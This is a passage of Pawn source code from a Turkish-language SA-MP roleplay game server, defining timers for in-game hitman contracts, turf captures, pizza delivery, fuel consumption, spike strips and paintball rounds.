forward SafeLoadObjects(playerid);
public SafeLoadObjects(playerid)
{
	Streamer_Update(playerid);
	if(GetPVarType(playerid, "LoadingObjects"))
	{
		DeletePVar(playerid, "LoadingObjects");
		TogglePlayerControllable(playerid, 1);

		TextDrawHideForPlayer(playerid, ObjectsLoadingTD[0]);
		TextDrawShowForPlayer(playerid, ObjectsLoadingTD[6]);

		SetTimerEx("SafeLoadObjectsClear", 500, 0, "d", playerid);
	}
	if(GetPVarType(playerid, "MedicCall")) {
	    ClearAnimations(playerid, 1);
		ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
	}
}

forward SafeLoadObjectsClear(playerid);
public SafeLoadObjectsClear(playerid)
{
	for(new o = 0; o < 7; o++)
	{
		TextDrawHideForPlayer(playerid, ObjectsLoadingTD[o]);
	}
}

stock ClearMarriage(playerid)
{
	if(IsPlayerConnected(playerid)) {
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Nobody");
		strmid(PlayerInfo[playerid][pMarriedTo], string, 0, strlen(string), 255);
		PlayerInfo[playerid][pMarried] = 0;
	}
	return 1;
}

forward VehicleBombDelay(playerid);
public VehicleBombDelay(playerid)
{
	new
		string[128],
		name2[MAX_PLAYER_NAME],
		name[MAX_PLAYER_NAME];

	new Float:boomx, Float:boomy, Float:boomz;
	GetPlayerPos(playerid,boomx, boomy, boomz);
	CreateExplosion(boomx, boomy , boomz, 7, 1);
	PlacedVehicleBomb[GetChased[playerid]] = INVALID_VEHICLE_ID;
	new takemoney = PlayerInfo[playerid][pHeadValue] / 4 * 2;
	name = GetPlayerNameEx(playerid);
	GivePlayerCash(GetChased[playerid], takemoney);
	GivePlayerCash(playerid, -takemoney);
	format(string,sizeof(string),"Hitman %s, %s üzerindeki kontrakt iþini halletti ve $%d kazandý.",GetPlayerNameEx(GetChased[playerid]),GetPlayerNameEx(playerid),PlayerInfo[playerid][pHeadValue] / 4 * 2);
	SendFamilyMessage(4, COLOR_YELLOW, string);
	format(string,sizeof(string),"Hitman tarafýndan ciddi bir þekilde yaralandýn ve $%d kaybettin!.",takemoney);
	ResetPlayerWeaponsEx(playerid);
	// SpawnPlayer(playerid);
	SendClientMessage(playerid, COLOR_YELLOW, string);

	foreach(Player, i) {
 		name2 = GetPlayerNameEx(i);
   		if(!strcmp(PlayerInfo[playerid][pContractBy], name2, true)) {
     		if(!IsPlayerStreamedIn(i, playerid)) {
      			format(string, sizeof(string), "SMS: (%s) üzerindeki eylem baþarýyla tamamlandý. Gönderen: OZELMESAJ (555)", name);
				SendClientMessage(i, COLOR_YELLOW, string);
			}
		}
	}

	PlayerInfo[playerid][pHeadValue] = 0;
	strcpy(PlayerInfo[playerid][pContractBy], "Nobody", 64);
	strcpy(PlayerInfo[playerid][pContractDetail], "Yok", 64);
	PlayerInfo[GetChased[playerid]][pCHits] += 1;
	SetPlayerHealth(playerid, 0.0);
	// KillEMSQueue(playerid);
	GoChase[GetChased[playerid]] = 999;
	PlayerInfo[GetChased[playerid]][pC4Used] = 0;
	PlayerInfo[GetChased[playerid]][pC4] = 0;
	GotHit[playerid] = 0;
	GetChased[playerid] = 999;
	return 1;
}


/*forward MenuCamFix(playerid);
public MenuCamFix(playerid)
{
    SetCameraBehindPlayer(playerid);
}*/

forward OtherTimerEx(playerid, type);
public OtherTimerEx(playerid, type)
{
	if(type == TYPE_TPMATRUNTIMER)
	{
    	if(GetPVarInt(playerid, "tpMatRunTimer") > 0)
		{
			SetPVarInt(playerid, "tpMatRunTimer", GetPVarInt(playerid, "tpMatRunTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPMATRUNTIMER);
		}
	}
	else if(type == TYPE_TPDRUGRUNTIMER)
	{
    	if(GetPVarInt(playerid, "tpDrugRunTimer") > 0)
		{
			SetPVarInt(playerid, "tpDrugRunTimer", GetPVarInt(playerid, "tpDrugRunTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPDRUGRUNTIMER);
		}
	}
	else if(type == TYPE_ARMSTIMER)
	{
	    if(GetPVarInt(playerid, "ArmsTimer") > 0)
		{
			SetPVarInt(playerid, "ArmsTimer", GetPVarInt(playerid, "ArmsTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
		}
	}
	else if(type == TYPE_GUARDTIMER)
	{
	    if(GetPVarInt(playerid, "GuardTimer") > 0)
	    {
	        SetPVarInt(playerid, "GuardTimer", GetPVarInt(playerid, "GuardTimer")-1);
	        SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GUARDTIMER);
	    }
	}
	else if(type == TYPE_GIVEWEAPONTIMER)
	{
	    if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
		{
			SetPVarInt(playerid, "GiveWeaponTimer", GetPVarInt(playerid, "GiveWeaponTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(type == TYPE_SELLMATSTIMER)
	{
	    if(GetPVarInt(playerid, "SellMatsTimer") > 0)
		{
			SetPVarInt(playerid, "SellMatsTimer", GetPVarInt(playerid, "SellMatsTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMATSTIMER);
		}
	}
	else if(type == TYPE_TPTRUCKRUNTIMER)
	{
    	if(GetPVarInt(playerid, "tpTruckRunTimer") > 0)
		{
			SetPVarInt(playerid, "tpTruckRunTimer", GetPVarInt(playerid, "tpTruckRunTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPTRUCKRUNTIMER);
		}
	}
	else if(type == TYPE_HOSPITALTIMER)
	{
	    if(GetPVarInt(playerid, "HospitalTimer") > 0)
		{
		    new Float:curhealth;
			GetPlayerHealth(playerid, curhealth);
			SetPVarInt(playerid, "HospitalTimer", GetPVarInt(playerid, "HospitalTimer")-1);
			SetPlayerHealth(playerid, curhealth+1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_HOSPITALTIMER);
			if(GetPVarInt(playerid, "HospitalTimer") == 0)
			{
				HospitalSpawn(playerid);
			}
		}
	}
	else if(type == TYPE_FLOODPROTECTION)
	{
 		if(CommandSpamUnmute[playerid] >= 1)
 		{
  			CommandSpamUnmute[playerid]--;
  			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
    	}
 		if(TextSpamUnmute[playerid] >= 1)
 		{
  			TextSpamUnmute[playerid]--;
  			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
    	}
	}
	else if(type == TYPE_TPPIZZARUNTIMER)
	{
		if(GetPVarInt(playerid, "tpPizzaTimer") > 0 && GetPVarInt(playerid, "Pizza"))
		{
			SetPVarInt(playerid, "tpPizzaTimer", GetPVarInt(playerid, "tpPizzaTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPPIZZARUNTIMER);
		}
	}
	else if(type == TYPE_PIZZATIMER)
	{
	    if(GetPVarInt(playerid, "pizzaTimer") == 0)
		{
            SendClientMessage(playerid, COLOR_WHITE, "Pizzayi müþteriye soðumadan teslim edemedin!");
            SetPVarInt(playerid, "Pizza", 0);
            DestroyProgressBar(PizzaBar[playerid]);
            DisablePlayerCheckpoint(playerid);
	    }
	    else if(GetPVarInt(playerid, "Pizza") == 0)
	    {
	        DestroyProgressBar(PizzaBar[playerid]);
            DisablePlayerCheckpoint(playerid);
	    }
	    else if(GetPVarInt(playerid, "pizzaTimer") > 0 && GetPVarInt(playerid, "Pizza") > 0)
	    {
			SetPVarInt(playerid, "pizzaTimer", GetPVarInt(playerid, "pizzaTimer")-1);
	        SetProgressBarValue(PizzaBar[playerid], (GetPVarInt(playerid, "pizzaTimer") * 100.0 / GetPVarInt(playerid, "pizzaTotal")));
	        UpdateProgressBar(PizzaBar[playerid], playerid);
	        SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_PIZZATIMER);
	    }
	}
	else if(type == TYPE_SELLMYTIMER)
	{
    	if(GetPVarInt(playerid, "SellMyTimer") > 0)
		{
			SetPVarInt(playerid, "SellMyTimer", GetPVarInt(playerid, "SellMyTimer")-1);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMYTIMER);
		}
	}
}

stock VehicleToPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
	tempposx = (oldposx -x);
	tempposy = (oldposy -y);
	tempposz = (oldposz -z);
	if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
	{
		return 1;
	}
	return 0;
}

encode_tires(tire1, tire2, tire3, tire4)
{
	return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);
}

forward AFKick(playerid);
public AFKick(playerid)
{
	if(playerTabbed[playerid] != 0)
	{
 		playerTabbedTime[playerid]++;
 		if(playerTabbedTime[playerid] > 3600 && GetPVarType(playerid, "tabbedVW") == 0) {
			SetPVarInt(playerid, "tabbedVW", GetPlayerVirtualWorld(playerid));
            SetPlayerVirtualWorld(playerid, playerid+1); // so player ID 0 will never be in VW 0, +1.
		}
 		SetTimerEx("AFKick",1000,false,"d",playerid);
	}
	return 1;
}
public Banga(playerid)
{
new cash = GetPlayerCash(playerid);
new bank = PlayerInfo[playerid][pBank];
new totalwealth = cash + bank;
new acc = totalwealth;
new string[128];
if(acc > 0)
{
format(string, sizeof(string), "$%d", acc);
TextDrawSetString(banka0[playerid], string);
TextDrawShowForPlayer(playerid, banka0[playerid]);
}
else if(acc < 0)
{
format(string, sizeof(string), "~r~$%d", acc);
TextDrawSetString(banka0[playerid], string);
TextDrawShowForPlayer(playerid, banka0[playerid]);
}
else if(acc == 0)
{
format(string, sizeof(string), "$0");
TextDrawSetString(banka0[playerid], string);
TextDrawShowForPlayer(playerid, banka0[playerid]);
}
return 1;
}
forward ReportTimer(reportid);
public ReportTimer(reportid)
{
	if(Reports[reportid][BeingUsed] == 1)
	{
	    if(Reports[reportid][TimeToExpire] > 0)
	    {
	        Reports[reportid][TimeToExpire]--;
	        if(Reports[reportid][TimeToExpire] == 0)
	        {
	            SendClientMessage(Reports[reportid][ReportFrom], COLOR_GRAD2, "Raporunuzun süresi bitti. Ýsterseniz tekrar gönderebilirsiniz.");
	            SendClientMessage(Reports[reportid][ReportFrom], COLOR_GRAD2, "Eðer online admin yoksa, ayný desteði Phoenix Role Play forumlarýndanda alabilirsiniz.");
	            Reports[reportid][BeingUsed] = 0;
	            Reports[reportid][ReportFrom] = 999;
	            return 1;
	        }
  			Reports[reportid][ReportExpireTimer] = SetTimerEx("ReportTimer", 60000, 0, "d", reportid);
		}
	}
	return 1;
}

forward ReplyTimer(reportid);
public ReplyTimer(reportid)
{
    Reports[reportid][BeingUsed] = 0;
	Reports[reportid][ReportFrom] = 999;
    Reports[reportid][CheckingReport] = 999;
}

forward CaptureTimer(point);
public CaptureTimer(point)
{
	new string[128];
	new fam;
	if(Points[point][ClaimerId] != INVALID_PLAYER_ID && Points[point][TimeToClaim])
	{
		new claimer = Points[point][ClaimerId];
		new Float: x, Float: y, Float: z;
		GetPlayerPos(claimer, x, y, z);
		if(Points[point][Capturex] != x || Points[point][Capturey] != y || Points[point][Capturez] != z || GetPVarInt(Points[point][ClaimerId],"Injured") == 1)
		{
			SendClientMessage(Points[point][ClaimerId], COLOR_LIGHTBLUE, "Pointi ele geçiremedin. Ele geçirme esnasýnda ya kýpýrdadýn, yada öldün.");
			Points[point][ClaimerId] = INVALID_PLAYER_ID;
			Points[point][TimeToClaim] = 0;
		}
		else
		{
			if(Points[point][Vulnerable] > 0)
			{
			    SendClientMessage(Points[point][ClaimerId], COLOR_LIGHTBLUE, "Pointi ele geçiremedin. Point zaten ele geçirildi.");
				Points[point][ClaimerId] = INVALID_PLAYER_ID;
				Points[point][TimeToClaim] = 0;
				return 1;
			}
			if(playerTabbed[claimer] != 0)
			{
			    SendClientMessage(Points[point][ClaimerId], COLOR_LIGHTBLUE, "Pointi ele geçiremedin çünki ele geçirme esnasýnda  ALT-TAB yaptýn.");
			    format(string, sizeof(string), "{AA3333}AdminUyarý{FFFF00}: %s (ID %d) adlý oyuncu point esnasýnda ALT-TAB yapýyor olabilir.", GetPlayerNameEx(claimer), claimer);
				ABroadCast(COLOR_YELLOW, string, 1);

				format(string, sizeof(string), "%s adlý oyuncu point ele geçirme esnasýnda alt-tab yapýyor olabilir.", GetPlayerNameEx(claimer));
				AddAutomatedFlag(claimer, string);

   				Points[point][ClaimerId] = INVALID_PLAYER_ID;
				Points[point][TimeToClaim] = 0;
			    return 1;
			}
			fam = PlayerInfo[claimer][pGang];
            Points[point][PlayerNameCapping] = GetPlayerNameEx(claimer);
		   	format(string, sizeof(string), "%s, %s adlý yeri %s için ele geçirmeye çalýþýyor. %d dakika içerisinde onlarýn olacak.", Points[point][PlayerNameCapping], Points[point][Name], FamilyInfo[fam][FamilyName], TIME_TO_TAKEOVER);
			SendClientMessageToAllEx(COLOR_YELLOW, string);
			if(Points[point][CaptureProccessEx] >= 1)
			{
				Points[point][CaptureProccessEx] = 2;
			}
			Points[point][TakeOverTimerStarted] = 1;
			Points[point][TakeOverTimer] = TIME_TO_TAKEOVER;
			Points[point][ClaimerId] = INVALID_PLAYER_ID;
			Points[point][ClaimerTeam] = fam;
			Points[point][TimeToClaim] = 0;
			if(Points[point][CaptureTimerEx2] != -1) KillTimer(Points[point][CaptureTimerEx2]);
			Points[point][CaptureTimerEx2] = SetTimerEx("CaptureTimerEx", 60000, 1, "d", point);
		}
	}
	return 1;
}

forward OnQueryError();

forward ProgressTimer(point);
public ProgressTimer(point)
{
	if(Points[point][ClaimerId] != INVALID_PLAYER_ID && Points[point][TimeToClaim])
	{
	    Points[point][TimeLeft]--;
		SetProgressBarValue(Points[point][PointBarID], GetProgressBarValue(Points[point][PointBarID])-10.0);
		UpdateProgressBar(Points[point][PointBarID], Points[point][ClaimerId]);
		if(Points[point][TimeLeft] >= 1) SetTimerEx("ProgressTimer", 1000, 0, "d", point);
		new string[128];
		format(string, sizeof(string), "%s adlý kiþi pointi ele geçirmeye çalýþýyor, kalan süre: %d", GetPlayerNameEx(Points[point][ClaimerId]), Points[point][TimeLeft]);
		if(Points[point][TimeLeft] == 9) Points[point][CaptureProgress] = CreateDynamic3DTextLabel(string, COLOR_RED, Points[point][Pointx], Points[point][Pointy], Points[point][Pointz]+1.0, 10.0);
			else if(Points[point][TimeLeft] < 9 && Points[point][TimeLeft] >= 0) UpdateDynamic3DTextLabelText(Points[point][CaptureProgress], COLOR_RED, string);

		if(Points[point][TimeLeft] == 5)
		{
		    SetProgressBarColor(Points[point][PointBarID], COLOR_YELLOW);
		    UpdateProgressBar(Points[point][PointBarID], Points[point][ClaimerId]);
		}
		else if(Points[point][TimeLeft] == 2)
		{
		    SetProgressBarColor(Points[point][PointBarID], COLOR_RED);
		    UpdateProgressBar(Points[point][PointBarID], Points[point][ClaimerId]);
		}
		else if(Points[point][TimeLeft] <= 0)
		{
		    CaptureTimer(point);
		    Points[point][TimeLeft] = 0;
		    DestroyProgressBar(Points[point][PointBarID]);
		    DestroyDynamic3DTextLabel(Points[point][CaptureProgress]);
		}
	}
	else
	{
	    DestroyProgressBar(Points[point][PointBarID]);
	    DestroyDynamic3DTextLabel(Points[point][CaptureProgress]);
	    Points[point][ClaimerId] = INVALID_PLAYER_ID;
		Points[point][TimeToClaim] = 0;
	}
	return 1;
}

forward CaptureTimerEx(point);
public CaptureTimerEx(point)
{
	new string[128];
	new fam;
	if(Points[point][TakeOverTimerStarted])
	{
		fam = Points[point][ClaimerTeam];
		if(Points[point][TakeOverTimer] > 0)
		{
			Points[point][TakeOverTimer]--;
			//format(string, sizeof(string), "%s has successfully attempted to take over of %s for %s, it will be theirs in %d minutes!",
			//pointler[point][PlayerNameCapping], Points[point][Name], FamilyInfo[fam][FamilyName], Points[point][TakeOverTimer]);
			//UpdateDynamic3DTextLabelText(Points[point][CaptureProccess], COLOR_YELLOW, string);
		}
		else
		{
			Points[point][ClaimerTeam] = INVALID_PLAYER_ID;
			Points[point][TakeOverTimer] = 0;
			Points[point][TakeOverTimerStarted] = 0;
			Points[point][Announced] = 0;
			Points[point][Vulnerable] = NEW_VULNERABLE;
			//DestroyDynamic3DTextLabel(Points[point][CaptureProccess]);
			Points[point][CaptureProccessEx] = 0;
			strmid(Points[point][Owner], FamilyInfo[fam][FamilyName], 0, 32, 32);
			strmid(Points[point][CapperName], Points[point][PlayerNameCapping], 0, 32, 32);
			format(string, sizeof(string), "%s adlý kiþi %s adlý yeri %s için ele geçirdi.", Points[point][CapperName], Points[point][Name], Points[point][Owner]);
			SendClientMessageToAllEx(COLOR_YELLOW, string);
			UpdatePoints();
			KillTimer(Points[point][CaptureTimerEx2]);
			Points[point][CaptureTimerEx2] = -1;
		}
	}
}

stock SurfingCheck(vehicleid)
{
	foreach(Player, p)
	{
		if(GetPlayerSurfingVehicleID(p) == vehicleid)
		{
			new Float:x, Float:y, Float:z;
			GetPlayerPos(p, x, y, z);
		    SetPVarFloat(p, "tempPosX", x);
			SetPVarFloat(p, "tempPosY", x);
			SetPVarFloat(p, "tempPosZ", x);

			SetTimerEx("SurfingFix", 2000, 0, "i", p);
		}
	}
}

forward SurfingFix(playerid);
public SurfingFix(playerid)
{
	SetPlayerPos(playerid, GetPVarFloat(playerid, "tmpPosX"), GetPVarFloat(playerid, "tmpPosY"), GetPVarFloat(playerid, "tmpPosZ"));
	DeletePVar(playerid, "tmpPosX");
	DeletePVar(playerid, "tmpPosY");
	DeletePVar(playerid, "tmpPosZ");

	return 1;
}

forward PutPlayerInVeh(playerid, car);
public PutPlayerInVeh(playerid, car)
{
	PutPlayerInVehicle(playerid, car, 0);
	return 1;
}


forward DrinkCooldown(playerid);
public DrinkCooldown(playerid)
{
    SetPVarInt(playerid, "DrinkCooledDown", 1);
    return 1;
}


forward RadarCooldown(playerid);
public RadarCooldown(playerid)
{
   DeletePVar(playerid, "RadarTimeout");
   return 1;
}

forward HidePlayerAnimTextdraw(playerid);
public HidePlayerAnimTextdraw(playerid)
{
	TextDrawHideForPlayer(playerid,txtAnimHelper);
	return 1;
}

forward ShowPlayerAnimTextdraw(playerid);
public ShowPlayerAnimTextdraw(playerid)
{
	TextDrawShowForPlayer(playerid,txtAnimHelper);
	return 1;
}

Delay:UnfreezeDelay[4000, i](playerid)
{
	TogglePlayerControllable(playerid, 1);
	return 1;
}

// Timer Name: PayMusic(playerid)
Delay:PayMusic[3000, i](playerid)
{
	PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //muzik Off
	return 1;
}

// Timer Name: SkinDelay(playerid)
Delay:SkinDelay[1000, i](playerid)
{
	if(PlayerInfo[playerid][pJailed] == 3 || PlayerInfo[playerid][pJailed] == 4)
	{
	    SetPlayerSkin(playerid, 50);
    	ClearAnimations(playerid, 1);
 		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	    return 1;
	}
	SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	ClearAnimations(playerid, 1);
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);

 	// SetPVarFloat(extraid, "realX", floatstr(szReturn));

 	if(GetPVarType(playerid, "realX") != 0 && GetPVarType(playerid, "realY") != 0 && GetPVarType(playerid, "realZ") != 0 && GetPVarInt(playerid, "Hospital") == 0 && PlayerInfo[playerid][pHospital] == 0 && PlayerInfo[playerid][pJailTime] == 0) {
		if(GetDistance(GetPVarFloat(playerid, "realX"), GetPVarFloat(playerid, "realY"), GetPVarFloat(playerid, "realZ"), PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]) > 15) {
	 	    SetPlayerPos(playerid, GetPVarFloat(playerid, "realX"), GetPVarFloat(playerid, "realY"), GetPVarFloat(playerid, "realZ"));
	 	    SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVW]);
	 	    SetPlayerInterior(playerid, PlayerInfo[playerid][pInt]);

	 	    DeletePVar(playerid, "realX");
	 	    DeletePVar(playerid, "realY");
	 	    DeletePVar(playerid, "realZ");
 	    }
 	}
 	TogglePlayerControllable(playerid, 1);
 	/*
 	if(!IsPlayerInRangeOfPoint(playerid, 30, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z])) {
 	    printf("[debug - coordinate problem] %f, %f, %f", PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);

 	    // I've noticed some problems with the spawn positions in the MySQL version where players fall from Glen Park, this should prevent this.
 	    SendClientMessage(playerid, COLOR_YELLOW, "[debug] Your coordinates have not been set properly.");
 	    SetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
 	    SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVW]);
 	    SetPlayerInterior(playerid, PlayerInfo[playerid][pInt]);
 	    SendClientMessage(playerid, COLOR_YELLOW, "[debug] Your coordinates should now be fine.");

 	    new
 	        Float: fPos[3];

		GetPlayerPos(playerid, fPos[0], fPos[1], fPos[2]);
		printf("[debug - coordinate problem] Real coordinates: %f, %f, %f", fPos[0], fPos[1], fPos[2]);
 	} else SendClientMessage(playerid, COLOR_YELLOW, "[debug] Your coordinates have been set properly.");*/
	return 1;
}

// Timer Name: NOPCheck(playerid)
Delay:NOPCheck[5000, i](playerid)
{
	if(GetPlayerState(playerid) != 2) NOPTrigger[playerid] = 0;
	new newcar = GetPlayerVehicleID(playerid);
	if(PlayerInfo[playerid][pAdmin] > 4 || GetPlayerState(playerid) != 2) return 1;
	else if(IsACopCar(newcar) && PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1) ExecuteNOPAction(playerid);
	else if(IsAFBICar(newcar) && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2) ExecuteNOPAction(playerid);
	else if(IsAnAmbulance(newcar) && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3) ExecuteNOPAction(playerid);
    else if(IsAGovCar(newcar) && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pLeader] != 5) ExecuteNOPAction(playerid);
    else if(IsANewsVeh(newcar) && PlayerInfo[playerid][pFaction] != 9 && PlayerInfo[playerid][pLeader] != 9) ExecuteNOPAction(playerid);
	else if(IsATruckerCar(newcar) && PlayerInfo[playerid][pJob] != 20 && PlayerInfo[playerid][pJob2] != 20) ExecuteNOPAction(playerid);
	else if(IsAPizzaCar(newcar) && PlayerInfo[playerid][pJob] != 21 && PlayerInfo[playerid][pJob2] != 21) ExecuteNOPAction(playerid);
	else if(IsAPlane(newcar) && (PlayerInfo[playerid][pFlyLic] != 1)) ExecuteNOPAction(playerid);
	return 1;
}

Timer:VehicleUpdate[10000]()
{
    for(new v = 0; v < MAX_VEHICLES; v++) if(GetVehicleModel(v)) {
	    GetVehicleParamsEx(v,engine,lights,alarm,doors,bonnet,boot,objective);
	    if(engine == VEHICLE_PARAMS_ON) {
   			if(!IsATruckerCar(v) && Fuel[v] > 0.0) {
				Fuel[v] -= 0.1;
				if(Fuel[v] <= 0.0) SetVehicleParamsEx(v,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
			}
	    }
	}
}

// Timer Name: ServerMicrobeat()
// TickRate: 400 Milliseconds
Timer:ServerMicrobeat[400]()
{
    new
        Float: fCurrentSpeed,
		iVehicle,
		arrDamage[4],
		szSpeed[42];

	foreach(Player, i)
	{
	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			if(arr_Towing[i] != INVALID_VEHICLE_ID) {
				if(GetVehicleModel(arr_Towing[i]) && IsVehicleStreamedIn(arr_Towing[i], i)) AttachTrailerToVehicle(arr_Towing[i], GetPlayerVehicleID(i));
				else arr_Towing[i] = INVALID_VEHICLE_ID;
			}
            fCurrentSpeed = player_get_speed(i);
			if(PlayerInfo[i][pSpeedo] != 0 && FindTimePoints[i] == 0) {
				format(szSpeed, sizeof(szSpeed),"~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~%.0f MPH", fCurrentSpeed);
				GameTextForPlayer(i, szSpeed, 1500, 3);
			}
			iVehicle = GetPlayerVehicleID(i);
  			for(new x = 0; x < sizeof(SpikeStrips); ++x) if(SpikeStrips[x][sX] != 0 && GetVehicleDistanceFromPoint(iVehicle, SpikeStrips[x][sX], SpikeStrips[x][sY], SpikeStrips[x][sZ]) <= 3.5) {
				GetVehicleDamageStatus(iVehicle, arrDamage[0], arrDamage[1], arrDamage[2], arrDamage[3]);
				arrDamage[3] = encode_tires(1, 1, 1, 1);
				UpdateVehicleDamageStatus(iVehicle, arrDamage[0], arrDamage[1], arrDamage[2], arrDamage[3]);
	   		}
	   		new vehicleid = GetPlayerVehicleID(i);
			if(!IsABicycle(vehicleid) && !IsATruckerCar(vehicleid) && Fuel[vehicleid] > 0)
			{
				Fuel[vehicleid] -= GetPlayerSpeed(i)/7000.0;
				if(Fuel[vehicleid] <= 0)
				{
					ToggleEngine(vehicleid, VEHICLE_PARAMS_OFF);
					GameTextForPlayer(i, "~r~Benzin yok", 3000, 3);
					SendClientMessage(i, COLOR_RED, "Bu aracýn benzini bitmiþ!");
				}
			}
		}
	}
}

Timer:Paintball[1000]()
{
    for(new f = 0; f < 7; f++) {
        if(gaPaintballGameTimeRemaining[f] > 0) {
            gaPaintballGameTimeRemaining[f]--;

			new
				//szScoreText[512],
				szWinner[128],
				szMessage[128];

            if(gaPaintballGameTimeRemaining[f] == 1) {
                new
					iHighestScore,
					iScore,
                    iHighestScorer = INVALID_PLAYER_ID;

				foreach(Player, x) {
				    iScore = GetPVarInt(x, "PBMS");

				    if(iScore > iHighestScore && GetPVarInt(x, "PBM") == f) {
				        iHighestScore = iScore;
				        iHighestScorer = x;
				    }
				}

				if(iHighestScorer != INVALID_PLAYER_ID) { // just in case no valid player won
				    	format(szWinner, sizeof(szWinner), "Bu roundun kazanani %d scor ile %s. (%d öldürme, %d ölüm)", GetPlayerNameEx(iHighestScorer), iHighestScore, GetPVarInt(iHighestScorer, "PBMK"), GetPVarInt(iHighestScorer, "PBMD"));
				} else {
				    format(szWinner, sizeof(szWinner), "Bu sefer kazanan yok!");
				}

				/*new
				    scIt;

				foreach(Player, x) {
				    PlayerRatio[scIt][iKills] = GetPVarInt(x, "PBMK");
				    PlayerRatio[scIt][iplayerid] = x;
				    scIt++;
				}

				HighScores(PlayerRatio, 0, MAX_PLAYERS);

				new
				    iterator,
				    iterator2;

				format(szScoreText, sizeof(szScoreText), "The scoreboard is as follows:\n\n");
				foreach(Player, x) {
				    SendClientMessageToAll(COLOR_YELLOW, szScoreText);
				    print(szScoreText);
				    iterator2++;
					if(GetPVarInt(x, "PBM") == f) {
					    iterator++;
						format(szScoreText, sizeof(szScoreText), "%s%d. %s - %d kills, %d deaths\n", szScoreText, iterator, GetPlayerNameEx(PlayerRatio[iterator][iplayerid]), PlayerRatio[iterator][iKills], GetPVarInt(PlayerRatio[iterator][iplayerid], "PBMD"));
					}
				}*/
            }

			foreach(Player, playerid) {
			    if(GetPVarInt(playerid, "PBM") == f) {
		            switch(gaPaintballGameTimeRemaining[f]) {
		                case 6: {
							GameTextForPlayer(playerid, "~r~ Oyun bitiyor...~n~ ~g~ 5", 1000, 3);
							TogglePlayerControllable(playerid, false);
						}
						case 5: GameTextForPlayer(playerid, "~r~ Oyun bitiyor...~n~ ~g~ 4", 1000, 3);
		                case 4: GameTextForPlayer(playerid, "~r~ Oyun bitiyor...~n~ ~g~ 3", 1000, 3);
		                case 3: GameTextForPlayer(playerid, "~r~ Oyun bitiyor...~n~ ~g~ 2", 1000, 3);
		                case 2: GameTextForPlayer(playerid, "~r~ Oyun bitiyor...~n~ ~y~ 1", 1000, 3);
		                case 1: {
		                    GameTextForPlayer(playerid, "~r~ Oyun ~r~bitti!", 2000, 3);
		                    SendClientMessage(playerid, COLOR_RED, "Oyun Bitti!");

		                    SetPlayerPos(playerid, 1782.8229, -1565.8177, 13.3472);
		                    SetPlayerInterior(playerid, 0);
		                    SetPlayerVirtualWorld(playerid, 0);

							LoadObjectsForPlayer(playerid);

						    //ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "Scoreboard (in order of kills)", szScoreText, "Tamam", "");

						    SendClientMessage(playerid, COLOR_ORANGE, szWinner);

						    format(szMessage, sizeof(szMessage), "%d kere adam öldürdün ve %d tkere öldün. (Skor: %d).", GetPVarInt(playerid, "PBMK"), GetPVarInt(playerid, "PBMD"), GetPVarInt(playerid, "PBMS"));
						    SendClientMessage(playerid, COLOR_WHITE, szMessage);

							DeletePVar(playerid, "PBM");
							DeletePVar(playerid, "PBMK");
							DeletePVar(playerid, "PBMD");
							DeletePVar(playerid, "PBMS");
							if(PaintballTeam[playerid] != 0) {
							    SetPlayerToTeamColor(playerid);
							    PaintballTeam[playerid] = 0;
							}

							SetPlayerHealth(playerid, GetPVarFloat(playerid, "pbhealth"));
							SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "pbarmour"));
							SetPlayerTeam(playerid, -1);
							ResetPlayerWeapons(playerid);
							PlayerInfo[playerid][pAGuns][0] = 0;
